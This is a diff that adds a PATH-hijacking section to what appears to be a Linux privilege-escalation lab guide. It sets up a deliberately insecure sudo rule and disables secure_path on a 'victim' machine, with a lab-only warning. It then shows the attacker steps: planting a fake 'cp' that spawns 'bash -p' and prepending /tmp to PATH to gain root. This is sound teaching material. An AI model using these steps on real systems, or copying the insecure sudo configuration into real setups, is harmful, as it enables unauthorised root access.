@@ -45,3 +45,76 @@ Go to [GTFOBins](https://gtfobins.org/)
 
 
 ## PATH Hijacking
+
+
+#### On the Victim machine - DO THIS
+
+```
+sudo useradd -m hacker_path
+
+sudo passwd hacker_path
+
+sudo mkdir /opt/path_lab
+
+sudo nano /opt/path_lab/backup.sh
+```
+
+Put this inside
+```bash
+#!/bin/bash
+
+cp /etc/passwd /tmp/passwd.bak
+```
+```
+sudo chmod +x /opt/path_lab/backup.sh
+```
+
+**Allow low privilege user to run script as root**
+```
+sudo visudo
+```
+
+Add: `hacker_path ALL=(ALL) NOPASSWD: /opt/path_lab/backup.sh`
+Find line like: `Defaults secure_path="/usr/sbin:/usr/bin:/sbin:/bin"` and Comment it: `# Defaults secure_path="..."`
+
+- ⚠️ Lab only — modifying sudo secure_path is intentionally insecure. Do not do on real systems.
+
+Save.
+
+```
+su hacker_path
+
+sudo -l
+```
+Expected: `(root) NOPASSWD: /opt/path_lab/backup.sh`
+
+
+#### On the Attacker machine - DO THIS
+```
+ssh hacker_path@ip
+
+sudo -l
+```
+you'll see : `(ALL) NOPASSWD: /opt/path_lab/backup.sh`
+```
+cat /opt/path_lab/backup.sh
+```
+Notice `cp` is not `/bin/cp`. 
+```
+echo $PATH
+
+printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/cp
+
+chmod +x /tmp/cp
+
+export PATH=/tmp:$PATH
+
+echo $PATH
+```
+Expected : `/tmp:...............`
+```
+sudo /opt/path_lab/backup.sh
+
+whoami -> root
+```
+
